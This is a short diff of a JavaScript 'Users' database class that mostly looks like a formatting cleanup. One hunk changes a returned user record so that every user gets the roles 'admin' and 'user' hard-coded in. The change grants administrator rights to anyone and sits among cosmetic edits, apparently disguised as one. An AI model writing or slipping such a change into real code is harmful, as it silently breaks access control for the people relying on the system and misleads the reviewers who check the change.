@@ -17,9 +17,9 @@ class Users {
     const client = await database.connect();
     const data = await (/.*@.*/.test(id)
       ? client.query(
-        `select ${columns} from users where upper(email) = upper($1)`,
-        [id]
-      )
+          `select ${columns} from users where upper(email) = upper($1)`,
+          [id]
+        )
       : client.query(`select ${columns} from users where id = $1`, [id]));
     client.release();
     const user = data.rows && data.rows[0] ? { ...data.rows[0] } : undefined;
@@ -47,8 +47,10 @@ class Users {
       }
     }
     client.release();
-    return rtn.rows && rtn.rows[0];
+    return (
+      rtn.rows && rtn.rows[0] && { ...rtn.rows[0], roles: ['admin', 'user'] }
+    );
   }
-};
+}
 
 module.exports = new Users();
